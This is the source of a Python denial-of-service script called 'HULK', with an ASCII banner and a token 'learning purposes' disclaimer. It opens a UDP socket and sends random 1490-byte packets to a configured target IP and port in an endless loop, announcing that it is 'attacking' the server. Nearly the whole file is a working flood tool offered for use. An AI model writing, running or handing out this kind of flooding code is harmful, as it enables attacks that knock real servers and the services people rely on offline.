"""
************************************************
*            _  _ _   _ _    _  __             *
*           | || | | | | |  | |/ /             * 
*           | __ | |_| | |__| ' <              *
*           |_||_|\___/|____|_|\_\             *
*                                              *
*          HTTP Unbearable Load King           *
*          Author: Sumalya Chatterjee          *
*                                              *
************************************************
************************************************
*                                              *    
*  [!] Disclaimer :                            *
*  1. Don't Use For Personal Revenges          *
*  2. Author Is Not Responsible For Your Jobs  *
*  3. Use for learning purposes                * 
*  4. Does HULK suit in villain role, huh?     *
************************************************
"""

import os
import socket
import random
from config import Config

config = Config()


def hulk():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    ip = config.ATKIPv4
    port = config.ATKPort
    print(f" [+] HULK is attacking server {ip}")
    try:
        while True:
            sock.sendto(bytes, (ip, port))
            if port == 65534:
                port = 1
    except KeyboardInterrupt:
        print(" ")
        print("\n [-] Ctrl+C Detected.........Exiting")
        print(" [-] DDOS ATTACK STOPPED")
    input(" Enter To Exit")
    os.system("clear")
    print(" [-] Dr. Banner is tired...")
